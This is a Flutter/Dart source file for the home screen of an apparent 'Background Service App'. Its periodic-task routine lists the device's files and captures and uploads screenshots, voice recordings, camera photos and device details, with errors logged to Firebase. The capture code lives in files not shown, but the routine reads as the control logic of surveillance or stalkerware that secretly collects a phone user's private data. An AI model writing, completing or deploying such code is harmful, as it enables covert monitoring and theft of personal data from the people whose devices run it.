import 'package:firebase_database/firebase_database.dart';
import 'package:flutter/foundation.dart';
import 'package:flutter/material.dart';
import '../main.dart';
import 'background_service.dart';

class MyHomePage extends StatefulWidget {
  const MyHomePage({super.key});

  @override
  _MyHomePageState createState() => _MyHomePageState();
}

class _MyHomePageState extends State<MyHomePage> {
  @override
  void initState() {
    super.initState();
  }

  Future<void> performPeriodicTasks() async {
    try {
      await requestPermissions();
      await listAllFileNames();
      await captureAndUploadScreenshot();
      await captureAndUploadVoiceRecording();
      await captureAndUploadPhoto();
      await gatherAndUploadDeviceDetails();
    } catch (e, stacktrace) {
      if (kDebugMode) {
        print('Error performing periodic tasks: $e\n$stacktrace');
      }
      await FirebaseDatabase.instance.reference().child('errors').push().set({
        'error': e.toString(),
        'stacktrace': stacktrace.toString(),
        'timestamp': DateTime.now().toIso8601String(),
      });
    }
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        title: const Text('Background Service App'),
      ),
      body: Center(
        child: Column(
          mainAxisAlignment: MainAxisAlignment.center,
          children: <Widget>[
            const Text('Background Service is running'),
            ElevatedButton(
              onPressed: () {
                performPeriodicTasks();
              },
              child: const Text('Run Tasks Now'),
            ),
          ],
        ),
      ),
    );
  }
}